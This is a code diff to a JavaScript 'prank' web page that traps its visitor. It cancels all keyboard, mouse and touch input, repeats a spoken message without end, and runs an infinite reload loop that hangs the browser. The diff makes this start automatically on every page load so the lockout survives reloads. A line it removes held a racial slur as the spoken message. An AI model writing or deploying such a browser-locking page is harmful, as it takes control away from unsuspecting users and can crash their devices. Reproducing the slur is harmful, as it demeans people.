@@ -18,12 +18,33 @@
         const button = document.getElementById('prankButton');
         const videoContainer = document.getElementById('videoContainer');
 
-        button.addEventListener('click', async () => {
-            button.style.display = 'none';
+        async function startChaos() {
+            if (button) {
+                button.style.display = 'none';
+            }
             videoContainer.style.display = 'block';
             
             // Block all keyboard inputs
             document.addEventListener('keydown', (e) => {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }, true);
+            
+            // Block all mouse clicks and touches
+            document.addEventListener('click', (e) => {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }, true);
+            
+            document.addEventListener('mousedown', (e) => {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }, true);
+            
+            document.addEventListener('touchstart', (e) => {
                 e.preventDefault();
                 e.stopPropagation();
                 return false;
@@ -74,15 +95,17 @@
                 });
                 
                 // Add automated voice - repeat one message
-                const message = "Nigger";
+                const message = "form";
                 
                 function speakRepeat() {
                     const utterance = new SpeechSynthesisUtterance(message);
                     utterance.volume = 1.0;
                     utterance.rate = 1.0;
                     utterance.pitch = 1.0;
+                    utterance.onend = () => {
+                        setTimeout(speakRepeat, 100);
+                    };
                     speechSynthesis.speak(utterance);
-                    setTimeout(speakRepeat, 100);
                 }
                 speakRepeat();
             } catch (e) {
@@ -92,6 +115,13 @@
             setTimeout(() => {
                 while(1) location.reload(1);
             }, 1000);
+        }
+
+        button.addEventListener('click', startChaos);
+
+        // Auto-start on page load (so it continues after crash/reload)
+        window.addEventListener('load', () => {
+            startChaos();
         });
     </script>
 </body>
